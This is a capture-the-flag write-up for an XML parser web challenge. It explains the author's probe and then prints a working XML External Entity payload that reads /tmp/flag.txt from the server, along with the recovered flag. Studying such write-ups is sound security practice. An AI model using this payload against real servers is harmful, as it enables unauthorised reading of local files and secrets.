# XML Parser (Web) - Digital Defenders CTF 2023

## Description
> Oh, how delightful! You're just dying to receive some input to parse, aren't you? And the best part is, we never bother checking your inputs because, who needs safety precautions? So, here's a special treat just for you—a perfectly crafted server that will surely make your parsing adventure a thrilling rollercoaster ride. Don't fret about any potential risks or vulnerabilities. After all, why would anyone take advantage of such a glorious opportunity? So, go ahead and trust blindly as you delve into parsing this magical piece of data. Best of luck, dear friend, and may the parsing deities shower you with blessings!
>
> _The flag is in /tmp/flag.txt_

> **FLAG FORMAT:** bi0s{...}

## The Website
![image](https://github.com/ghost-1608/CTF-Write-Ups/assets/64543976/f9c9e84f-63ba-4be0-8333-8e1e31f37610)
The website has a textbox to enter XML in. On pressing submit, it parses the XML to display the output right there.

I entered the following code to try it out
```XML
<?xml version="1.0"?>
    <change-log>
        <text>Hello World</text>
    </change-log>
```
  
On entering the above code and hitting "Submit", we get
![image](https://github.com/ghost-1608/CTF-Write-Ups/assets/64543976/1db85083-9519-449d-aa0d-44fe988761da)

## Initial Takeaway
The challenge description made the goal very clear, to exploit XML External Entity Attack. The vulnerability this attack uses is parsing of XML code as is by a website.
So all I had to do was to craft an XML code to execute some command. The description also mentioned that the flag is located in `/tmp/flag.txt`. This made it clear that I had to execute a command to get the contents of `flag.txt`.
Another point to note down was that the website was using a POST request.

## Execution
I crafted the following XML code to execute my command
```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///tmp/flag.txt">
]>
<foo>&xxe;</foo>
```
In simple words, it does exactly as I had planned earlier. The code gets the output of `flag.txt` and stores it in the variable `xxe`. Then it dereferences `xxe` to display the output on the screen the same way it displayed "Hello World".
So, I entered the code as decided and hit "Submit".
  
Et voilà
![image](https://github.com/ghost-1608/CTF-Write-Ups/assets/64543976/d5140bbf-57de-4d60-a24e-0930192cc8ea)

**(DISCLAIMER):** One thing to note is that according to the information released by the organisers, some CTF challenges use dynamic flags. Hence, the flag I solved the challenge with, and the flag at the time of writing this write-up are different.
The method however remains the same.

**FLAG:** `bi0s{icsTXDzJJDiv6FeaNshGkw==}`
